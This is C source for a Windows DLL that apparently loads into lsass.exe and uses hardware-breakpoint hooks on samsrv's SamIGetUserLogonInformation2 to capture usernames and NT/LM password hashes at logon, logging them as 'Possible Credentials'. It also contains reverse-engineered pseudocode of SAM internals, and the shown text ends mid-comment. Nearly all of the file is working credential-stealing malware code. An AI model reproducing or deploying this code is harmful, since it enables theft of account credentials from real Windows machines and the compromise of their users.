#include <Windows.h>       
#include <Tlhelp32.h>
#include <Stdio.h>         

#include "HardwareBreakingLib.h"
#include "LsasrvExports.h"
#include "Log.h"           


// ======================================================================================================================================================

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// https://github.com/winsiderss/phnt/blob/master/ntsam.h#L1203
#define USER_ALL_USERID 0x00000004


// ======================================================================================================================================================

#define HOOKED_DLL_NAME	            L"Samsrv.dll"     
#define DLL_WAIT_TIME_OUT		    1000 * 05                                   // 5 seconds

#define PROC_NAME_TO_MONITOR	    L"LogonUI.exe"
#define PROC_WAIT_TIME_OUT		    1000 * 60  * 1                              // 1 minute

#define FUNCTION_TO_HOOK            "SamIGetUserLogonInformation2" 
#define MONITORING_TIME_OUT	        1000 * 60  * 1                              // 1 minute

// ======================================================================================================================================================

// \
#define PRINT_CTX

//\
#define CREDENTIALS_THROUGH_RSP

// ======================================================================================================================================================

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


// ======================================================================================================================================================
/*
	@ Global variables
*/

static HANDLE g_hFoundEvent = NULL;

// ======================================================================================================================================================

/*
@ Waits for a module to load
*/
HMODULE WaitForModuleToLoad(IN LPCWSTR szModuleName, IN DWORD dwTimeoutMs) {

    DWORD       dwStart     = GetTickCount64();
    HMODULE     hModule     = NULL;

    while (TRUE) {

        if ((hModule = GetModuleHandleW(szModuleName)))
            return hModule;

        if (GetTickCount64() - dwStart > dwTimeoutMs)
        {
            DBGPRINTF(L"[!] WaitForModuleToLoad Timeout After %d ms\n", dwTimeoutMs);
            return NULL;
        }

        Sleep(50);

    }
}

// ======================================================================================================================================================

/*
	@ Fetches the PID of the LogonUI.exe process
*/

BOOL FetchLogonUIProcessID(OPTIONAL OUT DWORD* pdwLogonUIPid) {

    PROCESSENTRY32      ProcEntry           = { .dwSize = sizeof(PROCESSENTRY32) };
    HANDLE			    hSnapShot           = INVALID_HANDLE_VALUE;
	BOOL                bResults            = FALSE;

    if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
        DBGPRINTF(L"[!] CreateToolhelp32Snapshot Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

	if (!Process32First(hSnapShot, &ProcEntry)) {
		DBGPRINTF(L"[!] Process32First Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}
	
    do {
         
        if (_wcsicmp(ProcEntry.szExeFile, PROC_NAME_TO_MONITOR) == 0x00) 
        {
            if (pdwLogonUIPid)
				*pdwLogonUIPid = ProcEntry.th32ProcessID;

            bResults = TRUE;
            break;
        }

    } while (Process32Next(hSnapShot, &ProcEntry));


_END_OF_FUNC:
    if (hSnapShot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapShot);
	return bResults;
}

// ======================================================================================================================================================

/*
	@ Waits for the LogonUI.exe process to start
*/
BOOL MonitorLogonUIProcess() {

    while (TRUE)
    {
		DWORD dwLogonUIPid = 0x00;

		if (FetchLogonUIProcessID(&dwLogonUIPid))
		{
			if (dwLogonUIPid)
			{
				DBGPRINTF(L"[i] Found LogonUI.exe PID: %d\n", dwLogonUIPid);
                SetEvent(g_hFoundEvent);
				return TRUE;
			}
		}

		Sleep(100);
    }

	return FALSE;
}

// ======================================================================================================================================================


VOID WriteHexUnicode(IN LPCWSTR szName, IN PBYTE pBuffer, IN DWORD dwBufferLength, IN BOOL bQueryMemAccess) {

    DWORD dwIndex = 0x00;

    DBGPRINTF(L"[*] %s Hex Unicode Dump:\n", szName);
    DBGPRINTF(L"[*] Address\t\tHex\t\tUnicode\n");
    DBGPRINTF(L"[*] ----------------------------------------\n");

    if (!pBuffer || dwBufferLength == 0x00)
    {
        DBGPRINTF(L"[*] 0x%08X\t\t(null)\t\t(null)\n", dwIndex);
        return;
    }

    if (bQueryMemAccess)
    {
        MEMORY_BASIC_INFORMATION MemBasicInfo = { 0 };

        __try
        {
            VirtualQuery(pBuffer, &MemBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBGPRINTF(L"[!] VirtualQuery Failed With Error: %d\n", GetLastError());
        }

        if (MemBasicInfo.Protect & PAGE_GUARD)
        {
            DBGPRINTF(L"[i] Memory Guard Page Detected: [ 0x%p ] ... [ 0x%08X ]\n", MemBasicInfo.BaseAddress, MemBasicInfo.RegionSize);
            return;
        }

        if (MemBasicInfo.Protect & PAGE_NOACCESS)
        {
            DBGPRINTF(L"[!] Memory No Access Detected: [ 0x%p ] ... [ 0x%08X ]\n", MemBasicInfo.BaseAddress, MemBasicInfo.RegionSize);
            return;
        }
    }

    __try
    {
        for (dwIndex = 0x00; dwIndex < dwBufferLength; dwIndex++) {
            if ((dwIndex % 8) == 0) {
                DBGPRINTF(L"[*] 0x%08X\t", dwIndex);
            }
            DBGPRINTF(L"%04X ", ((WCHAR*)pBuffer)[dwIndex]);
            if ((dwIndex % 8) == 7) {
                DBGPRINTF(L"\t");
                for (DWORD i = dwIndex - 7; i <= dwIndex; i++) {
                    if (((WCHAR*)pBuffer)[i] >= 0x20 && ((WCHAR*)pBuffer)[i] <= 0x7E) {
                        DBGPRINTF(L"%c", ((WCHAR*)pBuffer)[i]);
                    }
                    else {
                        DBGPRINTF(L".");
                    }
                }
                DBGPRINTF(L"\n");
            }
        }

        if ((dwIndex % 8) != 0) {
            DBGPRINTF(L"\n");
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DWORD dwExceptionCode = GetExceptionCode();

        switch (dwExceptionCode) {

        /*
        case EXCEPTION_ACCESS_VIOLATION:
            DBGPRINTF(L"[!] Access Violation Exception: Invalid/Uncommented Memory Access\n");
            break;

        case STATUS_GUARD_PAGE_VIOLATION:
            DBGPRINTF(L"[!] Guard Page Violation Exception: Protected Memory Access\n");
            break;
        */

        default:
            // DBGPRINTF(L"[!] Exception Occurred While Dumping Memory: 0x%08X\n", dwExceptionCode);
            break;
        }

        return;
    }
}

// ======================================================================================================================================================

VOID PrintpUnicodeStringProtected(IN ULONG_PTR uAdress)
{
    PUNICODE_STRING     uPossibleCredentials    = NULL;

    __try
    {
        uPossibleCredentials = (UNICODE_STRING*)uAdress;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
    }

    __try
    {
        if (uPossibleCredentials->Buffer) 
        {
            if (uPossibleCredentials->Length <= uPossibleCredentials->MaximumLength)
				DBGPRINTF(L"[*] Possible Credentials Found: %s\n", uPossibleCredentials->Buffer);
            else
                WriteHexUnicode(L"Possible Credentials Found", (PBYTE)uPossibleCredentials->Buffer, uPossibleCredentials->Length, FALSE);
        }
        else 
        {
            DBGPRINTF(L"[!] Invalid PUNICODE_STRING Buffer: [ %p ]\n", uPossibleCredentials);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
    }
}


// ======================================================================================================================================================


#ifdef PRINT_CTX

static volatile LONG64 g_PrintedCtxCount = 0x00;

VOID PrintAddrPntrProtected(IN LPCWSTR szAddrName, IN ULONG_PTR uAddress)
{
    __try
    {
        DBGPRINTF(L"[i] %s: 0x%p\n", szAddrName, (PVOID)(*(ULONG_PTR*)uAddress));
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
    }

}

VOID PrintThreadContext(IN PCONTEXT pThreadCtx) 
{

	DBGPRINTF(L"[i] Thread Context [ #%I64d ]:\n", InterlockedIncrement64(&g_PrintedCtxCount));

	DBGPRINTF(L"[i] Rax: 0x%p\n", pThreadCtx->Rax);
	DBGPRINTF(L"[i] Rcx: 0x%p\n", pThreadCtx->Rcx);
	DBGPRINTF(L"[i] Rdx: 0x%p\n", pThreadCtx->Rdx);
	DBGPRINTF(L"[i] Rsi: 0x%p\n", pThreadCtx->Rsi);
	DBGPRINTF(L"[i] R8: 0x%p\n", pThreadCtx->R8);
	DBGPRINTF(L"[i] R9: 0x%p\n", pThreadCtx->R9);
	
    for (int i = 5; i < 9; i++)
    {
        WCHAR szRspOffset[32] = { 0 };
		swprintf_s(szRspOffset, _countof(szRspOffset), L"Rsp + 0x%02X", (unsigned int)(i * sizeof(PVOID)));
        PrintAddrPntrProtected(szRspOffset, pThreadCtx->Rsp + i * sizeof(PVOID));
    }


    DBGPRINTF(L"[i] Rip: 0x%p\n", pThreadCtx->Rip);
    DBGPRINTF(L"[i] Rbp: 0x%p\n", pThreadCtx->Rbp);
    DBGPRINTF(L"[i] Rdi: 0x%p\n", pThreadCtx->Rdi);
    DBGPRINTF(L"[i] Rbx: 0x%p\n", pThreadCtx->Rbx);
    DBGPRINTF(L"[i] R10: 0x%p\n", pThreadCtx->R10);
    DBGPRINTF(L"[i] R11: 0x%p\n", pThreadCtx->R11);
    DBGPRINTF(L"[i] R12: 0x%p\n", pThreadCtx->R12);
    DBGPRINTF(L"[i] R13: 0x%p\n", pThreadCtx->R13);
    DBGPRINTF(L"[i] R14: 0x%p\n", pThreadCtx->R14);
    DBGPRINTF(L"[i] R15: 0x%p\n", pThreadCtx->R15);
    
    /*
    DBGPRINTF(L"[i] SegCs: 0x%p\n", pThreadCtx->SegCs);
    DBGPRINTF(L"[i] SegDs: 0x%p\n", pThreadCtx->SegDs);
    DBGPRINTF(L"[i] SegEs: 0x%p\n", pThreadCtx->SegEs);
    DBGPRINTF(L"[i] SegFs: 0x%p\n", pThreadCtx->SegFs);
    DBGPRINTF(L"[i] SegGs: 0x%p\n", pThreadCtx->SegGs);
    DBGPRINTF(L"[i] SegSs: 0x%p\n", pThreadCtx->SegSs);
    DBGPRINTF(L"[i] EFlags: 0x%p\n", pThreadCtx->EFlags);
    DBGPRINTF(L"[i] Dr0: 0x%p\n", pThreadCtx->Dr0);
    DBGPRINTF(L"[i] Dr1: 0x%p\n", pThreadCtx->Dr1);
    DBGPRINTF(L"[i] Dr2: 0x%p\n", pThreadCtx->Dr2);
    DBGPRINTF(L"[i] Dr3: 0x%p\n", pThreadCtx->Dr3);
    DBGPRINTF(L"[i] Dr6: 0x%p\n", pThreadCtx->Dr6);
    DBGPRINTF(L"[i] Dr7: 0x%p\n", pThreadCtx->Dr7);
    DBGPRINTF(L"[i] ContextFlags: 0x%p\n", pThreadCtx->ContextFlags);
    DBGPRINTF(L"[i] MxCsr: 0x%p\n", pThreadCtx->MxCsr);
    DBGPRINTF(L"[i] VectorControl: 0x%p\n", pThreadCtx->VectorControl);
    DBGPRINTF(L"[i] DebugControl: 0x%p\n", pThreadCtx->DebugControl);
    DBGPRINTF(L"[i] LastExceptionToRip: 0x%p\n", pThreadCtx->LastExceptionToRip);
    DBGPRINTF(L"[i] LastExceptionFromRip: 0x%p\n", pThreadCtx->LastExceptionFromRip);
    DBGPRINTF(L"[i] LastBranchToRip: 0x%p\n", pThreadCtx->LastBranchToRip);
    DBGPRINTF(L"[i] LastBranchFromRip: 0x%p\n", pThreadCtx->LastBranchFromRip);
    */

}

#endif // PRINT_CTX

// ======================================================================================================================================================


#ifdef CREDENTIALS_THROUGH_RSP

typedef struct _LOGON_HOURS
{
    USHORT UnitsPerWeek;
    PUCHAR LogonHours;
} LOGON_HOURS, * PLOGON_HOURS;

typedef struct _SR_SECURITY_DESCRIPTOR
{
    ULONG Length;
    PUCHAR SecurityDescriptor;
} SR_SECURITY_DESCRIPTOR, * PSR_SECURITY_DESCRIPTOR;

typedef struct _USER_ALL_INFORMATION
{
    LARGE_INTEGER LastLogon;
    LARGE_INTEGER LastLogoff;
    LARGE_INTEGER PasswordLastSet;
    LARGE_INTEGER AccountExpires;
    LARGE_INTEGER PasswordCanChange;
    LARGE_INTEGER PasswordMustChange;
    UNICODE_STRING UserName;
    UNICODE_STRING FullName;
    UNICODE_STRING HomeDirectory;
    UNICODE_STRING HomeDirectoryDrive;
    UNICODE_STRING ScriptPath;
    UNICODE_STRING ProfilePath;
    UNICODE_STRING AdminComment;
    UNICODE_STRING WorkStations;
    UNICODE_STRING UserComment;
    UNICODE_STRING Parameters;
    UNICODE_STRING LmPassword;
    UNICODE_STRING NtPassword;
    UNICODE_STRING PrivateData;
    SR_SECURITY_DESCRIPTOR SecurityDescriptor;
    ULONG UserId;
    ULONG PrimaryGroupId;
    ULONG UserAccountControl;
    ULONG WhichFields;
    LOGON_HOURS LogonHours;
    USHORT BadPasswordCount;
    USHORT LogonCount;
    USHORT CountryCode;
    USHORT CodePage;
    BOOLEAN LmPasswordPresent;
    BOOLEAN NtPasswordPresent;
    BOOLEAN PasswordExpired;
    BOOLEAN PrivateDataSensitive;
} USER_ALL_INFORMATION, * PUSER_ALL_INFORMATION;

typedef struct _USER_ALLOWED_TO_DELEGATE_TO_LIST
{
    ULONG Size;
    ULONG NumSPNs;
    UNICODE_STRING SPNList[ANYSIZE_ARRAY];
} USER_ALLOWED_TO_DELEGATE_TO_LIST, * PUSER_ALLOWED_TO_DELEGATE_TO_LIST;

typedef struct _USER_INTERNAL6_INFORMATION
{
    USER_ALL_INFORMATION I1;
    LARGE_INTEGER LastBadPasswordTime;
    ULONG ExtendedFields;
    BOOLEAN UPNDefaulted;
    UNICODE_STRING UPN;
    PUSER_ALLOWED_TO_DELEGATE_TO_LIST A2D2List;
} USER_INTERNAL6_INFORMATION, * PUSER_INTERNAL6_INFORMATION;

// ======================================================================================================================================================

static PVOID volatile g_pInfo = NULL;

// ======================================================================================================================================================

VOID FunctionDetour(IN PCONTEXT pThreadCtx) 
{

#ifdef PRINT_CTX

	DBGPRINTF(L"================================================================================\n");
	PrintThreadContext(pThreadCtx);

#else 
    
    DBGPRINTF(L"[i] %hs's Detour Executed\n", FUNCTION_TO_HOOK);

    if (pThreadCtx->R9 == USER_ALL_USERID)
    {
	    if (pThreadCtx->Rdx == 0x4000 && pThreadCtx->Rsi == 0x4000)
	    {
		    DBGPRINTF(L"[i] Attempting To Fetch Credentials:\n");

            PUSER_INTERNAL6_INFORMATION pInfo = NULL;

            __try
            {
                pInfo = *(PUSER_INTERNAL6_INFORMATION*)(pThreadCtx->Rsp + 0x38);
				InterlockedExchangePointer(&g_pInfo, pInfo);

                DBGPRINTF(L"[i] [RSP + 0x38]: 0x%p\n", (PVOID)pInfo);
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
            }
			
	    }
    }

    if (InterlockedCompareExchangePointer(&g_pInfo, NULL, NULL))
    {
        PUSER_INTERNAL6_INFORMATION pInfo = InterlockedCompareExchangePointer(&g_pInfo, NULL, NULL);

        __try
        {
            PrintpUnicodeStringProtected(&pInfo->I1.UserName);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
        }

        __try
        {
            PrintpUnicodeStringProtected(&pInfo->I1.FullName);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
        }

        __try
        {
            PrintpUnicodeStringProtected(&pInfo->I1.NtPassword);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
        }

        __try
        {
            PrintpUnicodeStringProtected(&pInfo->I1.LmPassword);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
        }

        __try
        {
            PrintpUnicodeStringProtected(&pInfo->I1.PrivateData);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBGPRINTF(L"[!] Exception Occurred At Line %ld : 0x%08X\n", __LINE__, GetExceptionCode());
        }

        InterlockedExchangePointer(&g_pInfo, NULL);
    }

#endif // PRINT_CTX

	CONTINUE_EXECUTION(pThreadCtx);
}

// This works because SamIGetUserLogonInformation2 is nothing but a wrapper for Sam[p]GetUserLogonInformation
// It has only one return instruction
ULONG_PTR GetRetAddress(IN PBYTE pFunction) {

    for (int i = 0; i < 0x100; i++)
    {
        if (pFunction[i] == 0xC3) 
        {
            return (ULONG)(pFunction + i);
        }
    }

    return NULL;
}

#else

VOID FunctionDetour(IN PCONTEXT pThreadCtx)
{

#ifdef PRINT_CTX

    DBGPRINTF(L"================================================================================\n");
    PrintThreadContext(pThreadCtx);

#else 

    DBGPRINTF(L"[i] %hs's Detour Executed\n", FUNCTION_TO_HOOK);

    if (pThreadCtx->R9 == USER_ALL_USERID)
    {
        if (pThreadCtx->Rdx == 0x4000 && pThreadCtx->Rsi == 0x4000)
        {
            DBGPRINTF(L"[i] Attempting To Fetch Credentials:\n");

            for (int  i = 0; i < 0x04; i++)
            {
                __try
                {
					PrintpUnicodeStringProtected((ULONG_PTR)(pThreadCtx->R8 + (i * sizeof(UNICODE_STRING))));
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                    DBGPRINTF(L"[!] Exception Occurred At [ i:%d ] Line %ld : 0x%08X\n", i, __LINE__, GetExceptionCode());
                }
            }
        }
    }

#endif // PRINT_CTX

    CONTINUE_EXECUTION(pThreadCtx);
}


#endif // CREDENTIALS_THROUGH_RSP


// ======================================================================================================================================================

BOOL SetDebugPrivilege() {

    BOOL	            bResult                 = FALSE;
    TOKEN_PRIVILEGES	TokenPrivs              = { 0 };
    LUID				Luid                    = { 0 };
    HANDLE	            hCurrentTokenHandle     = NULL;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
        DBGPRINTF(L"[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
        DBGPRINTF(L"[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    TokenPrivs.PrivilegeCount = 0x01;
    TokenPrivs.Privileges[0].Luid = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        DBGPRINTF(L"[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        DBGPRINTF(L"[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hCurrentTokenHandle)
        CloseHandle(hCurrentTokenHandle);
    return bResult;
}



// ======================================================================================================================================================

BOOL ExecStart() {

	HMODULE             hModule                                         = NULL;
	HANDLE              hMonitorThread                                  = NULL;
    ULONG_PTR           uFunction                                       = NULL;
    ULONG_PTR           uFunctionEnd                                    = NULL;
    BOOL                bHookingLibInit                                 = FALSE,
                        bResults                                        = FALSE;
    WCHAR*              szModuleName                                    = HOOKED_DLL_NAME;
    CHAR*               cFunctionName                                   = FUNCTION_TO_HOOK;

    if (!(bHookingLibInit = InitHardwareBreakpointHooking())) {
        DBGPRINTF(L"[!] InitHardwareBreakpointHooking Failed\n");
        goto _END_OF_FUNC;
    }

	// May be required to suspend some threads while setting the hardware breakpoint
    if (!SetDebugPrivilege()) 
    {
		DBGPRINTF(L"[!] SetDebugPrivilege Failed\n");
    }

	if (!(g_hFoundEvent = CreateEventW(NULL, FALSE, FALSE, NULL))) {
		DBGPRINTF(L"[!] CreateEvent Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hModule = WaitForModuleToLoad(szModuleName, DLL_WAIT_TIME_OUT))) {
        DBGPRINTF(L"[!] WaitForModuleToLoad Failed For %s With Error: %d\n", szModuleName, GetLastError());
        goto _END_OF_FUNC;
	}

	if (!(uFunction = (ULONG_PTR)GetProcAddress(hModule, cFunctionName))) {
		DBGPRINTF(L"[!] GetProcAddress Failed For %hs With Error: %d\n", cFunctionName, GetLastError());
        goto _END_OF_FUNC;
	}
   
	DBGPRINTF(L"[i] Found %hs's Start Address: 0x%p\n", cFunctionName,  uFunction);

#ifdef CREDENTIALS_THROUGH_RSP
	if (!(uFunctionEnd = GetRetAddress((PBYTE)uFunction))) {
		DBGPRINTF(L"[!] GetRetAddress Failed\n");
		goto _END_OF_FUNC;
	}

	DBGPRINTF(L"[i] Found %hs's End Address: 0x%p\n", cFunctionName, uFunctionEnd);
#endif // CREDENTIALS_THROUGH_RSP


	if (!(hMonitorThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)MonitorLogonUIProcess, NULL, 0x00, NULL))) {
		DBGPRINTF(L"[!] CreateThread Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	DBGPRINTF(L"[i] Waiting For %s To Load ...\n", PROC_NAME_TO_MONITOR);

	if (WaitForSingleObject(g_hFoundEvent, PROC_WAIT_TIME_OUT) != WAIT_OBJECT_0)
    {
		DBGPRINTF(L"[!] WaitForSingleObject Timeout After %d ms\n", PROC_WAIT_TIME_OUT);
		goto _END_OF_FUNC;
	}
        
    if (!InstallHardwareBreakingPntHook((PUINT_VAR_T)uFunction, Dr0, (PVOID)FunctionDetour, ALL_THREADS)) {
        DBGPRINTF(L"[!] InstallHardwareBreakingPntHook Failed (1)\n");
        goto _END_OF_FUNC;
    }

	DBGPRINTF(L"[+] Hooked %hs's Start\n", cFunctionName);

#ifdef CREDENTIALS_THROUGH_RSP

    if (!InstallHardwareBreakingPntHook((PUINT_VAR_T)uFunctionEnd, Dr1, (PVOID)FunctionDetour, ALL_THREADS)) {
        DBGPRINTF(L"[!] InstallHardwareBreakingPntHook Failed (2)\n");
        goto _END_OF_FUNC;
    }

    DBGPRINTF(L"[+] Hooked %hs's End\n", cFunctionName);

#endif // CREDENTIALS_THROUGH_RSP

    DBGPRINTF(L"[i] Monitering Function Call For [%d] ms ...\n", MONITORING_TIME_OUT);
    Sleep(MONITORING_TIME_OUT);

    DBGPRINTF(L"[#] Finished \n");
    bResults = TRUE;

_END_OF_FUNC:
    if (bHookingLibInit)
        CleapUpHardwareBreakpointHooking();
	if (hMonitorThread)
		CloseHandle(hMonitorThread);
	if (g_hFoundEvent)
		CloseHandle(g_hFoundEvent);
    return bResults;
}


// ======================================================================================================================================================

#define ACTIVE_IMPLEMENTATION		

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved) {

    
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DBGPRINTF(L"\n\n--------------------------------------------------------------------------------------\n");
        DBGPRINTF(L"[*] Hello From Lsass.exe: %d\n", GetCurrentProcessId());

#ifdef ACTIVE_IMPLEMENTATION
        DisableThreadLibraryCalls((HMODULE)hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecStart, NULL, 0x00, NULL);
#endif 

    }
   
    return TRUE;
}


// ======================================================================================================================================================



/*

// @ https://github.com/winsiderss/phnt/blob/master/ntsam.h#L1430
typedef struct _USER_INTERNAL6_INFORMATION
{
    USER_ALL_INFORMATION I1;
    LARGE_INTEGER LastBadPasswordTime;
    ULONG ExtendedFields;
    BOOLEAN UPNDefaulted;
    UNICODE_STRING UPN;
    PUSER_ALLOWED_TO_DELEGATE_TO_LIST A2D2List;
} USER_INTERNAL6_INFORMATION, *PUSER_INTERNAL6_INFORMATION;



// Elements in USER_ALL_INFORMATION are populated based on the USER_ALL_* flags:
// @ https://github.com/winsiderss/phnt/blob/master/ntsam.h#L1199


// @ https://github.com/winsiderss/phnt/blob/master/ntsam.h#L1340C1-L1375C48
typedef struct _USER_ALL_INFORMATION
{
    LARGE_INTEGER LastLogon;
    LARGE_INTEGER LastLogoff;
    LARGE_INTEGER PasswordLastSet;
    LARGE_INTEGER AccountExpires;
    LARGE_INTEGER PasswordCanChange;
    LARGE_INTEGER PasswordMustChange;
    UNICODE_STRING UserName;
    UNICODE_STRING FullName;
    UNICODE_STRING HomeDirectory;
    UNICODE_STRING HomeDirectoryDrive;
    UNICODE_STRING ScriptPath;
    UNICODE_STRING ProfilePath;
    UNICODE_STRING AdminComment;
    UNICODE_STRING WorkStations;
    UNICODE_STRING UserComment;
    UNICODE_STRING Parameters;
    UNICODE_STRING LmPassword;
    UNICODE_STRING NtPassword;
    UNICODE_STRING PrivateData;
    SR_SECURITY_DESCRIPTOR SecurityDescriptor;
    ULONG UserId;
    ULONG PrimaryGroupId;
    ULONG UserAccountControl;
    ULONG WhichFields;
    LOGON_HOURS LogonHours;
    USHORT BadPasswordCount;
    USHORT LogonCount;
    USHORT CountryCode;
    USHORT CodePage;
    BOOLEAN LmPasswordPresent;
    BOOLEAN NtPasswordPresent;
    BOOLEAN PasswordExpired;
    BOOLEAN PrivateDataSensitive;
} USER_ALL_INFORMATION, *PUSER_ALL_INFORMATION;

*/



/*
__int64 __fastcall @lsasrv!LsapSamExtGetUserLogonInformation2(
    SAMPR_HANDLE                        DomainHandle,       // RCX 
    ULONG                               LookupFlags,        // RDX
    PUNICODE_STRING                     UserName,           // R8
    ULONG                               WhichFields,        // R9
    ULONG                               ExtendedFields,     // [RSP+0x28]
	PSAM_MAPPED_ATTRIBUTE_SET           MappedAttrSet,      // [RSP+0x30]   
    PUSER_INTERNAL6_INFORMATION       * UserInfoOut,        // [RSP+0x38]   // OUT
    PSID_AND_ATTRIBUTES_LIST            LocalMembership,    // [RSP+0x40]   // OUT
    PSAMPR_HANDLE                       LocalUserHandle     // [RSP+0x48]   // OUT
)
{
    
    UNREFERENCED_PARAMETER(MappedAttrSet);

    // Use the global domain handle instead of the one passed in RCX
    DomainHandle = g_hIdProvExtSamAccountDomain;

    if (IsSamIDecodeClaimsBlobPresent()) {
        return @samsrv!SamIGetUserLogonInformation2(
            DomainHandle,
            LookupFlags,
            UserName,
			0x1B,                // override WhichFields (explained below)
            ExtendedFields,
            UserInfoOut,
            LocalMembership,
            LocalUserHandle
        );
    }

    // Otherwise bail out
    return STATUS_NOT_IMPLEMENTED;
}
*/

// =======================================================================================================================================================

/*
NTSTATUS @samsrv!SamIGetUserLogonInformation2(
   SAMPR_HANDLE                    DomainHandle,    // RCX
   ULONG                           LookupFlags,     // RDX
   PUNICODE_STRING                 UserName,        // R8
   ULONG                           WhichFields,     // R9
   ULONG                           ExtendedFields,  // [RSP+0x28]
   PUSER_INTERNAL6_INFORMATION*    UserInfo,        // [RSP+0x30]   // OUT
   PSID_AND_ATTRIBUTES_LIST*       LocalMembership, // [RSP+0x38]   // OUT
   PSAMPR_HANDLE*                  LocalUserHandle  // [RSP+0x40]   // OUT
)
{

    return @samsrv!SampGetUserLogonInformation(
        DomainHandle,
        LookupFlags,
        UserName,
        0x1B,                   // override WhichFields (explained below)
        ExtendedFields,
        UserInfo,
        LocalMembership,
        LocalUserHandle
    );
}
*/



// =======================================================================================================================================================

/*
NTSTATUS @samsrv!SampGetUserLogonInformation(
	SAMPR_HANDLE                    DomainHandle,    // RCX
	ULONG                           LookupFlags,     // RDX
	PUNICODE_STRING                 UserName,        // R8
	ULONG                           WhichFields,     // R9
	ULONG                           ExtendedFields,  // [RSP+0x28]  
	PUSER_INTERNAL6_INFORMATION*    UserInfo,        // [RSP+0x30]  // OUT
	PSID_AND_ATTRIBUTES_LIST*       LocalMembership, // [RSP+0x38]  // OUT
	PSAMPR_HANDLE*                  LocalUserHandle  // [RSP+0x40]  // OUT
)
{

    NTSTATUS           STATUS;
    UNICODE_STRING     LocalName;
    PWCHAR             NameBuffer = NULL;
    SIZE_T             AllocSize;
    USHORT             NameChars;
    BOOLEAN            bHeapAllocated = FALSE;
    ULONG              DsrmBehavior;
    BOOLEAN            bIsDsRunning;

    // 1) Check service state 
    if (g_SampServiceState != 2) 
    {
        //
        // WPP tracing:::WPP_SF_D( TRACE_LEVEL_ERROR, TraceGUIDs, DomainHandle, LookupFlags );
        //
        return STATUS_INVALID_DOMAIN_STATE; // 0xC00000DC
    }

    // 2) Compute how many WCHARs in the incoming UserName 
    NameChars = UserName->Length / sizeof(WCHAR);
    AllocSize = (NameChars + 1) * sizeof(WCHAR);
    AllocSize = (AllocSize + 0xF) & ~0xF;           // Round up to 16-byte

	// 3) Allocate a temporary buffer for the name
    NameBuffer = (PWCHAR)_alloca(AllocSize);
	if (NameBuffer == NULL) 
    {
        NameBuffer = g_pfnAllocate(AllocSize);
		if (NameBuffer == NULL) 
        {
            //
            // WPP tracing::: WPP_SF_D( TRACE_LEVEL_ERROR, TraceGUIDs, LookupFields );
            //
			return STATUS_INSUFFICIENT_RESOURCES;   // 0xC0000017
		}
        bHeapAllocated = TRUE;
	}


     RtlCopyMemory(NameBuffer, UserName->Buffer, UserName->Length);
	 NameBuffer[NameChars] = L'\0';

	 // 4) Initialize the UNICODE_STRING structure
	 LocalName.Length           = (USHORT)UserName->Length;
	 LocalName.MaximumLength    = (USHORT)AllocSize;
	 LocalName.Buffer           = NameBuffer;


	 // 5) Validate the SAM context handle
     STATUS = SampValidateContext(DomainHandle);
	 if (!NT_SUCCESS(STATUS)) 
     {
        //
        // WPP tracing::: WPP_SF_D( TRACE_LEVEL_ERROR, TraceGUIDs, STATUS );
        //
